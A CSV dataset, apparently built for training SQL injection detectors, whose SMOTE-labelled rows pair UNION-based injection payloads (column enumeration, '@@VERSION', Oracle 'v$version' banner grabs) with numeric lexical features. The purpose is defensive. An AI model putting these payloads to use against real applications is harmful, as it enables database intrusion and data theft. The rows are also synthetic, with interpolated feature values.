id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000175,0.18806862678916714,71.44214690732865,31.110536726832162,4.396042700591216,44.0,2.0,15.221073453664323,10.221073453664323,0.6160648894042328,0.02800294951837423,0.21296976743666426,0.14296239364072874,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.221073453664323,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000012,attack,union,"-7845' union all select 9574,9574,9574,9574,9574,9574#",nearest_attack_euclidean,R000292,0.05592851765339969,54.0,20.0,3.8370736393369,14.0,28.0,4.0,8.0,0.25925925925925924,0.5185185185185185,0.07407407407407407,0.14814814814814814,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,union,"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",nearest_attack_euclidean,R000719,0.04289388135945207,80.0,21.837280996393257,3.770976486435458,14.0,44.0,8.0,14.0,0.175,0.55,0.1,0.175,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,union,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",nearest_attack_euclidean,R000223,0.049446625142068094,74.0,21.84813579006864,3.5235937085365525,14.0,44.0,4.0,12.0,0.1891891891891892,0.5945945945945946,0.05405405405405406,0.16216216216216217,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,union,"-7255' union all select 2127,2127,2127,2127,2127#",nearest_attack_euclidean,R000329,0.10766106692208802,48.369217200211324,19.0,3.752737809183084,14.0,23.495373760169063,4.0,6.873843440042266,0.28981027792070563,0.48534884111466237,0.08280293654877303,0.14203794441585885,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8738434400422657,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,0.020889582169633786,62.07350290883169,19.014700581766338,3.5985510270328493,14.0,24.0,14.058802327065353,10.014700581766338,0.22555872876176125,0.3866721064487336,0.22643637543437847,0.16133278935512663,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0147005817663386,0.0,0.0,4.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000134,0.19915713652512823,97.0,25.344193804826048,4.031295407686882,62.65580619517395,4.0,23.0,7.344193804826048,0.6459361463419995,0.041237113402061876,0.23711340206185566,0.07571333819408296,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000018,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000092,0.23558202704610678,101.7107735882454,26.0,4.067183969100775,64.16861887059632,3.4578452823509203,24.08430943529816,10.0,0.630791113608957,0.034137877680629314,0.23669374918073754,0.09837725952967619,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000019,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000579,0.5388979167871832,73.2225595256713,26.110976189731478,3.9218261841823026,25.0,25.77804762053704,16.0,6.44451190513426,0.3418154210263561,0.3515381676134208,0.2187618694568679,0.0878845419033552,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.4445119051342603,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,union,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000642,0.4479177137746783,94.63461889836049,26.617949186448065,3.9729343135498882,56.707695118688385,9.0,15.0,13.926923779672096,0.5982071702718359,0.0955860772396567,0.15931012873276112,0.14689662375574628,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.926923779672096,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000021,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000016,0.0,83.0,29.0,3.9945533084585856,43.0,3.0,25.0,12.0,0.5180722891566265,0.03614457831325302,0.30120481927710846,0.14457831325301204,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000022,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000675,0.3176684097699661,70.04377328308091,20.60875465661618,3.6909510345016994,14.0,30.435018626464725,14.0,11.608754656616181,0.2001217193277088,0.434063141800761,0.2001217193277088,0.16569341954382133,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,5.608754656616181,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R000208,0.5972743181916615,66.04364820887446,22.395635179112553,3.8850486622276823,14.0,32.834918567099564,8.0,11.208729641774891,0.21318783930375185,0.4954459438517831,0.12182162245928675,0.1695445943851783,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,6.208729641774891,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000024,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000768,0.5146086476707402,57.648550903327774,22.21618363444259,3.849575610364182,14.0,21.729469075540717,12.702898193344463,9.21618363444259,0.24295914834895066,0.37590898223370334,0.2213407849046917,0.15979108451265428,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7838163655574104,1.0,0.0,3.432367268885179,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,union,"-9003""   )    )    union all select 9721,9721--",nearest_attack_euclidean,R000660,0.06276874123752464,47.34334110628736,21.06866822125747,3.825382389622465,14.0,12.27467288502989,14.0,7.068668221257472,0.2959055746775683,0.2589155205895894,0.2959055746775683,0.149273330055274,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.068668221257472,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,union," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000044,0.31394792540456506,87.0,27.0,3.8178931746125837,42.0,4.477667620723455,29.0,11.522332379276545,0.4827586206896552,0.051467443916361544,0.3333333333333333,0.13244060206064995,0.0,1.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,1.5223323792765449,5.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000027,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000598,0.5914320859514945,82.46680614310856,25.276230326602445,4.029440482477781,25.0,28.0,19.828690979807337,9.638115163301222,0.3036696600938591,0.3401100193051222,0.2393920057519209,0.1168283148490978,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.6381151633012232,0.0,0.0,3.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,union,"-9382'  )   union all select 4774,4774,4774,4774--",nearest_attack_euclidean,R000591,0.3849727818039837,47.63258625085546,21.0,3.8792691148365726,14.0,18.106069000684368,8.0,7.526517250171092,0.2947305744391216,0.37895632222982634,0.16841747110806948,0.15789563222298264,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.526517250171092,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000029,attack,union,"-2375 union all select 1573,1573,1573,1573#",nearest_attack_euclidean,R000283,0.1834862947571775,43.0,19.486625387958426,3.9641101550084366,14.0,20.0,4.0,5.0,0.32558139534883723,0.46511627906976744,0.09302325581395349,0.11627906976744186,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000030,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000702,0.19665841188942063,94.78498768816245,26.513995075264976,3.819741711843214,52.02799015052996,9.0,22.0,11.756997537632488,0.548773203637622,0.09500172971686563,0.23222645041900483,0.12399861622650751,0.0,1.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,5.756997537632488,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000031,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,0.15595666968720012,54.2932295518973,21.858645910379458,4.010375662213736,14.0,23.43458364151784,8.0,8.85864591037946,0.2581435586448865,0.43122348765016216,0.14751060493993512,0.16312234876501622,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.85864591037946,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000032,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,0.23630631806303912,83.48461177058643,24.0,3.927325661119064,27.0,34.787689416469135,11.0,10.696922354117284,0.3279230924117725,0.4113504089934548,0.1335982969084999,0.12712820168627278,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.696922354117284,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,union,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",nearest_attack_euclidean,R000426,0.027497090295425235,62.099669676019744,19.019933935203948,3.642624896091947,14.0,24.0,14.079735740815796,10.019933935203948,0.22547054033118044,0.3865209262820236,0.22666062601499828,0.16134790737179763,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.019933935203949,0.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
